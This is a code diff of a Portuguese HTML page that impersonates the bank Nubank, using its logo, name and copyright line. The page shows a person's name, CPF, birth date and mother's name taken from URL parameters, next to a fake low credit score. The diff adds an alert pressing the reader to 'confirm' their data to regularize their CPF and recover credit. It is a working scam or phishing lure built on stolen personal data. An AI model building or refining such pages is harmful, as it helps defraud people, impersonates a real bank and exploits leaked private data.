@@ -1,73 +1,107 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Demonstrativo de dados vazados</title>
-    <link rel="stylesheet" href="css/styles.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Demonstrativo de dados vazados</title>
+  <link rel="stylesheet" href="css/styles.css">
+  <style>
+    /* Caso não use o styles.css, mantém um fallback básico */
+    body { background:#fff; padding:15px; font-family: Arial, sans-serif; }
+    .container { max-width:500px; margin:0 auto; }
+    .header { display:flex; justify-content:center; align-items:center; margin-bottom:25px; padding-bottom:15px; border-bottom:2px solid #8A05BE; }
+    .logo { height:45px; width:auto; }
+    .alert { font-size:16px; line-height:1.5; color:#333; margin-bottom:25px; padding:15px; background:#f9f9f9; border-radius:8px; border:1px solid #eee; }
+    .info-box { border:1px solid #ccc; border-radius:8px; padding:15px; margin-bottom:12px; }
+    .info-label { font-size:14px; color:#666; margin-bottom:5px; text-transform: uppercase; }
+    .info-value { font-size:16px; font-weight:bold; color:#333; word-break:break-word; }
+    .footer { margin-top:25px; padding-top:20px; border-top:2px solid #8A05BE; text-align:center; }
+    .empresa { font-size:14px; color:#666; }
+  </style>
 </head>
-
 <body>
-    <div class="container">
-        <div class="header">
-            <img src="./images/nu-logo.png" alt="Nubank" class="logo">
-        </div>
-
-        <div class="info-box" data-key="name">
-            <div class="info-label">Nome completo:</div>
-            <div class="info-value" id="name"></div>
-        </div>
-        
-        <div class="info-box" data-key="cpf">
-            <div class="info-label">CPF:</div>
-            <div class="info-value" id="cpf"></div>
-        </div>
-        
-        <div class="info-box" data-key="dateOfBirth">
-            <div class="info-label">Data de nascimento:</div>
-            <div class="info-value" id="dateOfBirth"></div>
-        </div>
-        
-        <div class="info-box" data-key="motherName">
-            <div class="info-label">Nome da mãe:</div>
-            <div class="info-value" id="motherName"></div>
-        </div>
-        
-        <div class="info-box">
-            <div class="info-label">Score:</div>
-            <div class="info-value" id="score">129 Pontos - Baixo</div>
-        </div>
-
-        <div class="footer">
-            <p class="empresa">© 2025 Nubank. Todos os direitos reservados.</p>
-        </div>
+  <div class="container">
+    <div class="header">
+      <img src="./images/nu-logo.png" alt="Nubank" class="logo">
     </div>
 
-    <script>
-        const params = new URLSearchParams(window.location.search);
+    <div class="alert">Revise seus dados abaixo e confirme para regularizar seu CPF e recuperar seu crédito.</div>
 
-        const infoList = [
-            { key: "name", label: "Nome completo" },
-            { key: "cpf", label: "CPF" },
-            { key: "dateOfBirth", label: "Data de nascimento" },
-            { key: "motherName", label: "Nome da mãe" }
-        ];
+    <div id="info-container"></div>
 
-        infoList.forEach(item => {
-    const value = params.get(item.key);
-    const element = document.getElementById(item.key);
-    const box = document.querySelector(`.info-box[data-key="${item.key}"]`);
-    
-    if (value && value.trim() !== "" && !value.includes('{{')) {
-        element.textContent = value;
-    } else if (box) {
-        box.style.display = "none";
+    <div class="footer">
+      <p class="empresa">© 2025 Nubank. Todos os direitos reservados.</p>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+
+    const fields = [
+      { key: "name",        label: "Nome completo" },
+      { key: "cpf",         label: "CPF",           formatter: formatCPF },
+      { key: "dateOfBirth", label: "Data de nascimento" },
+      { key: "motherName",  label: "Nome da mãe" }
+    ];
+
+    const infoContainer = document.getElementById('info-container');
+    let showedAny = false;
+
+    // Helpers
+    function isValid(v) {
+      if (!v) return false;
+      const s = String(v).trim();
+      if (!s) return false;
+      const lowered = s.toLowerCase();
+      if (s.includes('{{') || s.includes('}}')) return false; // evita placeholders
+      if (['null','undefined','na','n/a','-','--'].includes(lowered)) return false;
+      return true;
     }
-});
 
-    </script>
+    function escapeHTML(str) {
+      return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+
+    function onlyDigits(s){ return String(s).replace(/\D/g,''); }
+    function formatCPF(v){
+      const d = onlyDigits(v);
+      if (d.length !== 11) return v;
+      return d.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4");
+    }
+
+    function addBox(label, value){
+      const box = document.createElement('div');
+      box.className = 'info-box';
+      box.innerHTML = `
+        <div class="info-label">${escapeHTML(label)}:</div>
+        <div class="info-value">${escapeHTML(value)}</div>
+      `;
+      infoContainer.appendChild(box);
+    }
+
+    // Render dinâmico dos campos
+    fields.forEach(f => {
+      let v = params.get(f.key);
+      if (!isValid(v)) return;
+      if (typeof f.formatter === 'function') v = f.formatter(v);
+      addBox(f.label, v);
+      showedAny = true;
+    });
+
+    // Score: sempre exibe (usa param se vier)
+    const score = isValid(params.get('score')) ? params.get('score') : '129 Pontos - Baixo';
+    addBox('Score', score);
+
+    // Se só o score ficou visível, remove o alerta
+    if (!showedAny) {
+      const alertEl = document.querySelector('.alert');
+      if (alertEl) alertEl.style.display = 'none';
+    }
+  </script>
 </body>
-
 </html>
